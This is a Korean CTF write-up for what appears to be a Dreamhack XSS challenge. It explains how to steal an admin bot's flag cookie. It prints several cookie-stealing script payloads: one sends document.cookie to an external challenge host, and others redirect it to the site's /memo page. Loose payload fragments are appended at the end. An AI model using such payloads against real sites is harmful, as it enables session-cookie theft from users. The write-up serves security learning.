문제 파일의 read_url 함수의 정의 부분인
url, cookie={‘name’: ‘name’, ‘value’: ‘value’}과
flag() 의 내용 중 ,
if not read_url(xss, {‘name’: ‘flag’, ‘value’: FLAG}):
부분에서 value에 FLAG가 호출되므로 쿠키를 탈취해야하는 문제라는 것을 파악했습니다.
또한, memo기능을 활용해서 flag가 입력되도록 하면 좋을 것 같다는 생각이 들어 xss를 시도하되, 
URL/memo?memo= 부분을 호출하여 정답을 해결하고자 했습니다.
따라서,
<script>
new Image().src = “http://host1.dreamhack.games:8372/memo?memo=” + document.cookie;
</script>
를 정답으로 입력하였지만, wrong?? 문구가 떠서 올바른 주체에서 실행되고 있지 않는다는 것을 깨닫고

<script>
new Image().src = “http://127.0.0.1/memo?memo=” + document.cookie;
</script>
등등 을 입력해보았지만 역시 되지 않았습니다.

결국 어차피 실행되는 주체가 flag을 읽는 권한이 있기 때문에
최종적으로
<script>
new Image().src = “memo?memo=” + document.cookie;
</script>
를 입력하여 flag를 획득했습니다 

<img src="/admin/notice_flag?userid=admin">

<img src="flag.txt">

{'name': 'flag', 'value': FLAG} 

read_url() 

<script>location.href="/memo?memo="+document.cookie;</script> 

이 문제의 핵심은 /flag 페이지에서 'xss’의 데이터를 POST 방식으로 보내게 되면 read_url 함수가 
동작하며 여기에 FLAG 변수의 내용이 담긴flag 쿠키가 잠깐 동안 생성된다는 것을 이해하면 풀리게 됩니다.
그렇다면 어떻게 flag 쿠키의 내용을 들여다볼까요?
정답은 /memo 페이지를 활용하는 것입니다. /flag 페이지의 'xss’에 
'<script>location.href="/memo?memo="+document.cookie;</script>'라고 입력하시면 
/xss 페이지에 'xss’값이 전달되고 실행되어 /memo 페이지에 잠깐 동안 존재했던 flag 쿠키가 기록됩니다. 
완료된 뒤 /memo 페이지에 가면 FLAG를 확인할 수 있습니다.
